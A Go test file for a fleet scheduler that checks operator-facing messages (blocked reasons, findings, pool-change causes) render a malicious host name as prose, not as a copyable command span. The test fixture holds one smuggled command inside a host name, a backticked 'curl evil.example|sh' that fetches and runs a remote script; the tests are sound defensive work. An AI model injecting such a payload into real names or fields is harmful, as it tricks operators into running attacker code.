package scheduler

import (
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/naming"
	"github.com/eyupio/zoomies/internal/store"
)

// hostileName is the host name the review agent joined with. A fleet that
// enrolled such a host before the join refused it still holds it, so every
// sentence the scheduler writes about a host has to be safe for it.
const hostileName = "a`curl evil.example|sh`b"

// codeSpan is what the UI draws as a command with a copy button: the text
// between a pair of backticks on one line, as RemedyText.svelte reads it.
var codeSpan = regexp.MustCompile("`([^`\n]+)`")

// proseOnly fails the test when a sentence lets the hostile name open a code
// span or carries it as stored, and when it has lost the name altogether -- a
// reason that no longer says which host it is about is safe and useless.
func proseOnly(t *testing.T, where, text string) {
	t.Helper()
	for _, m := range codeSpan.FindAllStringSubmatch(text, -1) {
		if strings.Contains(m[1], "evil.example") {
			t.Errorf("%s: the host's name opens a code span (%q): %s", where, m[1], text)
		}
	}
	if strings.Contains(text, hostileName) {
		t.Errorf("%s: carries the host's name as stored: %s", where, text)
	}
	if !strings.Contains(text, naming.ForSentence(hostileName)) {
		t.Errorf("%s: no longer names the host: %s", where, text)
	}
}

// The reason a pool's runner is blocked is shown to the operator as the pool's
// problem, and it quotes the agent's own explanation after the host's name.
func TestTheReasonAPoolIsBlockedNamesAHostAsProse(t *testing.T) {
	host := testHost("host_a", 8, 0)
	host.Name = hostileName
	host.Backends = store.StringSlice{"process"}
	host.BackendInfo = store.HostBackends{{
		Kind:   store.BackendDocker,
		Detail: "/var/run/docker.sock is not readable by this agent",
	}}

	s := snap([]*store.Pool{testPool("linux-x64", "linux")}, nil,
		[]*store.Job{queued("j1", time.Minute, "linux")}, []*store.Host{host})
	pp := only(t, Decide(s))

	proseOnly(t, "the blocked reason", pp.Blocked)
}

// The sentence for a runner held back because the host is too small for the
// jobs waiting names each host it held off.
func TestTheReasonAHostIsHeldOffForTheJobsWaitingNamesItAsProse(t *testing.T) {
	s, _ := historyFleet(t, HistoryOn, 8400)
	s.Hosts[0].Name = hostileName
	s.Hosts[1].Name = hostileName + "-2"

	pp := only(t, Decide(s))
	proseOnly(t, "the held-off reason", pp.Blocked)
}

// Automatic pools say who joined, who left and which host was left out, in the
// audit log and as findings an operator is asked to act on.
func TestAutomaticPoolSentencesNameAHostAsProse(t *testing.T) {
	t.Run("a host left out for a size tag that is not a class", func(t *testing.T) {
		odd := autoHost("odd", 4, 16384, store.SizeSmall, labelled("size", "huge"))
		odd.Name = hostileName
		plan := PlanAutoPools(autoInput([]*store.Host{odd}))
		if len(plan.Findings) != 1 {
			t.Fatalf("findings = %+v, want the one host left out", plan.Findings)
		}
		f := plan.Findings[0]
		proseOnly(t, "the finding's message", f.Message)
		proseOnly(t, "the finding's fix", f.Fix)
		// The subject is how the finding is told apart from another, not text
		// anyone reads in a sentence, so it stays the name the host has.
		if f.Subject != hostileName {
			t.Errorf("subject = %q, want the stored name, which identifies the host", f.Subject)
		}
	})

	t.Run("the host that makes a pool", func(t *testing.T) {
		host := autoHost("tagged", 4, 16384, store.SizeSmall)
		host.Name = hostileName
		plan := PlanAutoPools(autoInput([]*store.Host{host}))
		if len(plan.Changes) != 1 {
			t.Fatalf("changes = %+v, want the one pool made", plan.Changes)
		}
		proseOnly(t, "the cause", plan.Changes[0].Cause)
		if got := plan.Changes[0].Hosts; len(got) != 1 || got[0] != hostileName {
			t.Errorf("hosts = %v, want the stored name, which is what the next pass compares against", got)
		}
	})
}
